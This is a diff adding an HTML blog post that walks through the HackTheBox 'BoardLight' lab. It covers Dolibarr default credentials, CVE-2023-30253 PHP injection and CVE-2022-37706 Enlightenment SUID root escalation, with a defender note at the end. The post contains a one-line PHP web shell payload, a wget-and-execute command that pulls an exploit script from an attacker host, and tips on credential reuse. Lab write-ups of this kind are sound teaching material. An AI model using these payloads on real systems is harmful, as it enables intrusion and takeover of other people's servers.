@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="BoardLight — HackTheBox writeup by Tabarik Asif. Dolibarr CVE-2023-30253 PHP injection, Enlightenment SUID binary CVE-2022-37706 for root.">
+<meta property="og:title" content="BoardLight — Tabarik Asif">
+<meta property="og:description" content="Dolibarr default creds + CVE-2023-30253 PHP injection, Enlightenment SUID privesc CVE-2022-37706.">
+<meta property="og:url" content="https://tabarik.dev/blog/posts/boardlight.html">
+<title>BoardLight — Tabarik Asif</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='38' stroke='%2300FFE0' stroke-width='3' fill='none'/><line x1='50' y1='12' x2='50' y2='88' stroke='%2300FFE0' stroke-width='2'/><line x1='12' y1='50' x2='88' y2='50' stroke='%2300FFE0' stroke-width='2'/><circle cx='50' cy='50' r='4' fill='%2300FFE0'/></svg>">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&family=Bebas+Neue&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--c:#00FFE0;--c2:rgba(0,255,224,.07);--bg:#050505;--bg2:#090909;--bg3:#0f0f0f;--red:#FF453A;--amb:#FFD60A;--grn:#30D158;--blu:#0A84FF;--t1:#ffffff;--t2:#e8e8e8;--t3:#c0c0c0;--br:rgba(0,255,224,.14);--br2:rgba(0,255,224,.32);--glow:0 0 30px rgba(0,255,224,.18);--fn:'JetBrains Mono',monospace;--fd:'Bebas Neue',sans-serif;--fs:'Syne',sans-serif}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--t1);font-family:var(--fn);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='.4'/%3E%3C/svg%3E");opacity:.03;pointer-events:none;z-index:9000}
+#spb{position:fixed;top:0;left:0;height:2px;background:var(--c);z-index:9999;width:0;box-shadow:0 0 8px var(--c);transition:width .1s}
+#cur,#cur2{display:none}
+@media(hover:hover) and (pointer:fine){body{cursor:none}#cur{display:block;position:fixed;width:30px;height:30px;border:1px solid var(--c);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:width .18s,height .18s;mix-blend-mode:exclusion}#cur2{display:block;position:fixed;width:5px;height:5px;background:var(--c);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%)}}
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;display:flex;justify-content:space-between;align-items:center;padding:20px 8vw;transition:background .4s,border .4s}
+nav.stuck{background:rgba(5,5,5,.96);border-bottom:1px solid var(--br);backdrop-filter:blur(16px)}
+.nav-logo{font-family:var(--fd);font-size:1.5rem;letter-spacing:4px;color:var(--c);text-decoration:none}
+.nav-links{display:flex;gap:28px;list-style:none}
+.nav-links a{font-size:12px;letter-spacing:2.5px;text-transform:uppercase;color:var(--t1);text-decoration:none;transition:color .2s;opacity:.8}
+.nav-links a:hover,.nav-links a.act{color:var(--c);opacity:1}
+.post-header{padding:120px 8vw 64px;border-bottom:1px solid var(--br);max-width:900px}
+.breadcrumb{font-size:11px;letter-spacing:2px;color:var(--t3);margin-bottom:24px;display:flex;align-items:center;gap:10px}
+.breadcrumb a{color:var(--t3);text-decoration:none;transition:color .2s}
+.breadcrumb a:hover{color:var(--c)}
+.breadcrumb-sep{opacity:.4}
+.post-badges{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.badge{font-size:9px;letter-spacing:2px;padding:4px 10px;border:1px solid;display:inline-block}
+.badge-easy{border-color:rgba(48,209,88,.35);color:var(--grn)}
+.badge-medium{border-color:rgba(255,214,10,.35);color:var(--amb)}
+.badge-hard{border-color:rgba(255,69,58,.35);color:var(--red)}
+.badge-win{border-color:rgba(10,132,255,.35);color:var(--blu)}
+.badge-linux{border-color:rgba(255,255,255,.15);color:var(--t3)}
+.badge-cve{border-color:rgba(255,69,58,.35);color:var(--red)}
+.post-title{font-family:var(--fd);font-size:clamp(4rem,10vw,8rem);line-height:.85;letter-spacing:3px;color:var(--c);text-shadow:0 0 60px rgba(0,255,224,.1);margin-bottom:28px}
+.post-meta{display:flex;align-items:center;gap:20px;flex-wrap:wrap;font-size:11px;letter-spacing:1.5px;color:var(--t3);margin-bottom:20px}
+.post-meta span{display:flex;align-items:center;gap:6px}
+.post-tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:6px}
+.ptag{font-size:10px;letter-spacing:1px;padding:4px 10px;border:1px solid rgba(0,255,224,.18);color:var(--c)}
+.info-box{background:var(--bg2);border:1px solid var(--br);padding:28px 32px;margin-top:36px;display:grid;grid-template-columns:repeat(4,1fr);gap:24px}
+.info-lbl{font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase;margin-bottom:8px}
+.info-val{font-size:14px;color:var(--t1);letter-spacing:.5px}
+.info-val.cyan{color:var(--c);font-family:var(--fn)}
+.post-body{max-width:900px;padding:64px 8vw 100px}
+.post-body h2{font-family:var(--fs);font-size:1.5rem;font-weight:700;color:var(--t1);padding-left:16px;border-left:3px solid var(--c);margin:56px 0 24px;letter-spacing:.5px;line-height:1.2}
+.post-body h2:first-child{margin-top:0}
+.post-body h3{font-family:var(--fs);font-size:1.1rem;font-weight:700;color:var(--t2);margin:32px 0 14px}
+.post-body p{font-family:var(--fs);font-size:1rem;line-height:1.9;color:var(--t2);margin-bottom:18px}
+.post-body ul,.post-body ol{font-family:var(--fs);font-size:1rem;line-height:1.9;color:var(--t2);margin:0 0 18px 22px}
+.post-body li{margin-bottom:6px}
+.post-body code{background:rgba(0,255,224,.08);color:var(--c);padding:2px 6px;font-family:var(--fn);font-size:.88em;letter-spacing:.3px}
+pre{background:#000;border-left:3px solid var(--c);padding:20px 24px;margin:24px 0;overflow-x:auto;font-family:var(--fn);font-size:13px;line-height:1.7;scrollbar-width:thin;scrollbar-color:var(--br) transparent}
+pre .cmd{color:var(--amb)}pre .out{color:var(--grn)}pre .cmt{color:var(--t3);opacity:.6}
+.callout{background:rgba(0,255,224,.04);border:1px solid var(--br);border-left:3px solid var(--c);padding:16px 20px;margin:24px 0;font-size:13px;line-height:1.7;color:var(--t2)}
+.callout.warn{border-left-color:var(--amb);background:rgba(255,214,10,.04)}
+.callout.crit{border-left-color:var(--red);background:rgba(255,69,58,.04)}
+.callout-lbl{font-size:10px;letter-spacing:2px;margin-bottom:6px;text-transform:uppercase}
+.callout .callout-lbl{color:var(--c)}.callout.warn .callout-lbl{color:var(--amb)}.callout.crit .callout-lbl{color:var(--red)}
+.flags-box{background:var(--bg2);border:1px solid var(--br);padding:24px 28px;margin:24px 0;display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.flag-lbl{font-size:10px;letter-spacing:3px;color:var(--t3);text-transform:uppercase;margin-bottom:8px}
+.flag-val{font-family:var(--fn);font-size:13px;color:var(--c);letter-spacing:.5px;word-break:break-all}
+.back-link{display:inline-flex;align-items:center;gap:8px;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--t3);text-decoration:none;padding:0 8vw;margin:48px 0 16px;transition:color .2s}
+.back-link:hover{color:var(--c)}
+.post-nav{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--br);max-width:900px;margin:0 8vw}
+.pnav-card{background:var(--bg2);padding:28px 32px;text-decoration:none;color:inherit;display:block;transition:background .3s;position:relative;overflow:hidden}
+.pnav-card:hover{background:var(--bg3)}
+.pnav-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:.5s}
+.pnav-card:hover::before{transform:scaleX(1)}
+.pnav-dir{font-size:10px;letter-spacing:2px;color:var(--t3);margin-bottom:8px;text-transform:uppercase}
+.pnav-title{font-family:var(--fd);font-size:1.8rem;letter-spacing:2px;color:var(--c);line-height:1}
+.pnav-card.next{text-align:right}.pnav-card.next::before{transform-origin:right}
+footer{padding:36px 8vw;border-top:1px solid var(--br);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;margin-top:64px}
+.fb{font-family:var(--fd);font-size:1.2rem;letter-spacing:4px;color:var(--c)}
+.fc2{font-size:12px;color:var(--t3);letter-spacing:1px}.ft{font-size:11px;color:#1a1a1a;letter-spacing:1px}
+@media(max-width:900px){.info-box{grid-template-columns:repeat(2,1fr)}.post-nav{grid-template-columns:1fr}.flags-box{grid-template-columns:1fr}}
+@media(max-width:768px){nav{padding:16px 6vw}.nav-links{display:none}.post-header{padding:100px 6vw 48px}.post-body{padding:48px 6vw 80px}.post-nav,.back-link{margin-left:6vw;margin-right:6vw}footer{padding:32px 6vw}.info-box{grid-template-columns:1fr 1fr;padding:20px;gap:16px}}
+</style>
+</head>
+<body>
+<div id="spb"></div><div id="cur"></div><div id="cur2"></div>
+
+<nav id="nav">
+  <a href="../../" class="nav-logo">TABARIK</a>
+  <ul class="nav-links">
+    <li><a href="../../">Home</a></li>
+    <li><a href="../../#projects">Portfolio</a></li>
+    <li><a href="../" class="act">Blog</a></li>
+  </ul>
+</nav>
+
+<header class="post-header">
+  <div class="breadcrumb"><a href="../">Blog</a><span class="breadcrumb-sep">→</span><span>BoardLight</span></div>
+  <div class="post-badges">
+    <span class="badge badge-easy">EASY</span>
+    <span class="badge badge-linux">LINUX</span>
+    <span class="badge badge-cve">CVE-2023-30253</span>
+  </div>
+  <div class="post-title">BoardLight</div>
+  <div class="post-meta">
+    <span>April 26, 2026</span>
+    <span>10 min read</span>
+    <span style="color:var(--red)">CVE-2023-30253</span>
+  </div>
+  <div class="post-tags">
+    <span class="ptag">CVE</span><span class="ptag">SUID</span><span class="ptag">PHP Injection</span>
+  </div>
+  <div class="info-box">
+    <div class="info-item"><div class="info-lbl">Target IP</div><div class="info-val cyan">10.129.7.1</div></div>
+    <div class="info-item"><div class="info-lbl">OS</div><div class="info-val">Linux</div></div>
+    <div class="info-item"><div class="info-lbl">Difficulty</div><div class="info-val">Easy</div></div>
+    <div class="info-item"><div class="info-lbl">Platform</div><div class="info-val">HackTheBox</div></div>
+  </div>
+</header>
+
+<article class="post-body">
+
+  <h2>Recon</h2>
+
+  <p>Two ports on initial scan. The web server redirected to <code>board.htb</code> — added to hosts. A vhost scan found a subdomain running a different application.</p>
+
+  <pre>
+<span class="cmd">$ nmap -sC -sV -oN nmap/initial 10.129.7.1</span>
+<span class="out">22/tcp open  ssh   OpenSSH 8.2p1
+80/tcp open  http  Apache httpd 2.4.41
+|_http-redirect: http://board.htb/</span>
+  </pre>
+
+  <pre>
+<span class="cmd">$ echo "10.129.7.1 board.htb" >> /etc/hosts</span>
+<span class="cmd">$ gobuster vhost -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span>
+<span class="out">Found: crm.board.htb (Status: 200)</span>
+  </pre>
+
+  <pre>
+<span class="cmd">$ echo "10.129.7.1 crm.board.htb" >> /etc/hosts</span>
+  </pre>
+
+  <h2>Enumeration</h2>
+
+  <p><code>crm.board.htb</code> hosts Dolibarr ERP version 17.0.0. Default administrator credentials are <code>admin / admin</code> — they worked on first try.</p>
+
+  <pre>
+<span class="cmd">$ curl -s -b "DOLSESSID=..." http://crm.board.htb/index.php | grep "Dolibarr"</span>
+<span class="out">Dolibarr 17.0.0</span>
+  </pre>
+
+  <p>CVE-2023-30253: Dolibarr ERP ≤ 17.0.0 allows authenticated PHP code injection through the website module. When creating website pages, PHP code is allowed but the input filter converts <code>&lt;?php</code> to <code>&lt;?PHP</code> (uppercase). The fix for the filter can be bypassed using mixed case or the short echo tag syntax.</p>
+
+  <div class="callout crit">
+    <div class="callout-lbl">CVE-2023-30253</div>
+    Dolibarr's PHP filter converts <code>&lt;?php</code> to <code>&lt;?PHP</code> but doesn't account for mixed-case variants like <code>&lt;?PhP</code>. The mixed-case tag is still parsed as PHP by the interpreter, bypassing the security check and enabling code execution.
+  </div>
+
+  <h2>Foothold</h2>
+
+  <pre>
+<span class="cmt"># Create a new website in Dolibarr, add a page with PHP injection</span>
+<span class="cmt"># Dolibarr website module → New Website → Add Page → Source (HTML) mode</span>
+<span class="out">&lt;?PhP system($_GET['cmd']); ?&gt;</span>
+<span class="cmt"># Save and access the page at: http://crm.board.htb/public/website/[slug].php</span>
+  </pre>
+
+  <pre>
+<span class="cmd">$ curl "http://crm.board.htb/public/website/shell.php?cmd=id"</span>
+<span class="out">uid=33(www-data) gid=33(www-data)</span>
+  </pre>
+
+  <p>Upgrade to reverse shell. Then look for credentials to pivot to a system user.</p>
+
+  <pre>
+<span class="cmd">www-data@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ cat conf.php</span>
+<span class="out">$dolibarr_main_db_host='localhost';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';</span>
+  </pre>
+
+  <p>Database password — tried it as the password for local user <code>larissa</code>:</p>
+
+  <pre>
+<span class="cmd">www-data@boardlight:~$ su larissa</span>
+<span class="out">Password: serverfun2$2023!!</span>
+<span class="out">larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$</span>
+  </pre>
+
+  <h2>Privilege Escalation</h2>
+
+  <pre>
+<span class="cmd">larissa@boardlight:~$ find / -perm -4000 2>/dev/null | grep -v snap</span>
+<span class="out">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</span>
+  </pre>
+
+  <p>Enlightenment SUID binaries. Enlightenment ≤ 0.25.3 is vulnerable to CVE-2022-37706: a local privilege escalation via the enlightenment_sys SUID binary. The binary allows an authenticated user to perform privileged operations — a crafted exploit path creates a directory structure that tricks the binary into executing an arbitrary command as root.</p>
+
+  <pre>
+<span class="cmt"># CVE-2022-37706 exploit script (multiple PoCs on GitHub, e.g. MaherAzzouzi)</span>
+<span class="cmd">larissa@boardlight:~$ wget http://10.10.14.X/exploit.sh && chmod +x exploit.sh && ./exploit.sh</span>
+<span class="out">[*] Checking if /tmp/exploit exists...
+[*] Path: /dev/../tmp/exploit
+[*] Exploiting...
+[+] Got root!</span>
+<span class="cmd"># id</span>
+<span class="out">uid=0(root) gid=0(root) groups=0(root)</span>
+  </pre>
+
+  <h2>Flags</h2>
+
+  <div class="flags-box">
+    <div class="flag-item"><div class="flag-lbl">User Flag</div><div class="flag-val">/home/larissa/user.txt</div></div>
+    <div class="flag-item"><div class="flag-lbl">Root Flag</div><div class="flag-val">/root/root.txt</div></div>
+  </div>
+
+  <h2>Lessons Learned</h2>
+
+  <ul>
+    <li>Default credentials on ERP systems like Dolibarr are surprisingly common in production — admin/admin should be the first thing you try on any business application login page.</li>
+    <li>PHP injection filter bypasses via case manipulation: the filter converts <code>&lt;?php</code> to <code>&lt;?PHP</code> but PHP's parser is case-insensitive for the opening tag — <code>&lt;?PhP</code> executes normally.</li>
+    <li>Database configuration files in web application directories routinely contain passwords that are reused for local system accounts — always check conf.php, wp-config.php, and similar files immediately after getting a shell.</li>
+    <li>SUID binaries from desktop environment utilities (Enlightenment, GNOME helpers, KDE tools) are easy to miss in a SUID search — look for non-standard paths like <code>/usr/lib/x86_64-linux-gnu/enlightenment/</code>.</li>
+  </ul>
+
+  <div class="callout warn">
+    <div class="callout-lbl">Defender Note</div>
+    Change default ERP credentials on first deployment. Dolibarr's PHP injection filter should use a whitelist approach rather than a blacklist — any user-supplied content rendered as PHP is dangerous. Use unique, strong passwords for database accounts and never reuse them for system user accounts.
+  </div>
+
+</article>
+
+<a href="../" class="back-link">← All Posts</a>
+
+<div class="post-nav">
+  <a href="monitored.html" class="pnav-card prev">
+    <div class="pnav-dir">← Previous</div>
+    <div class="pnav-title">Monitored</div>
+  </a>
+  <a href="linkvortex.html" class="pnav-card next">
+    <div class="pnav-dir">Next →</div>
+    <div class="pnav-title">LinkVortex</div>
+  </a>
+</div>
+
+<footer>
+  <a href="../../" class="fb" style="text-decoration:none;">TABARIK.DEV</a>
+  <div class="fc2">© 2025 M. Tabarik Asif — All rights reserved.</div>
+  <div class="ft">Built with caffeine &amp; 0days.</div>
+</footer>
+
+<script>
+const cur=document.getElementById('cur'),cur2=document.getElementById('cur2');
+let mx=0,my=0,rx=0,ry=0;
+if(window.matchMedia('(hover:hover) and (pointer:fine)').matches){
+  document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px';});
+  (function lp(){rx+=(mx-rx)*.12;ry+=(my-ry)*.12;cur2.style.left=rx+'px';cur2.style.top=ry+'px';requestAnimationFrame(lp);})();
+  document.querySelectorAll('a,button').forEach(el=>{
+    el.addEventListener('mouseenter',()=>{cur.style.width='50px';cur.style.height='50px';});
+    el.addEventListener('mouseleave',()=>{cur.style.width='30px';cur.style.height='30px';});
+  });
+}
+window.addEventListener('scroll',()=>{
+  const pct=scrollY/(document.documentElement.scrollHeight-innerHeight)*100;
+  document.getElementById('spb').style.width=pct+'%';
+  document.getElementById('nav').classList.toggle('stuck',scrollY>50);
+});
+</script>
+</body>
+</html>
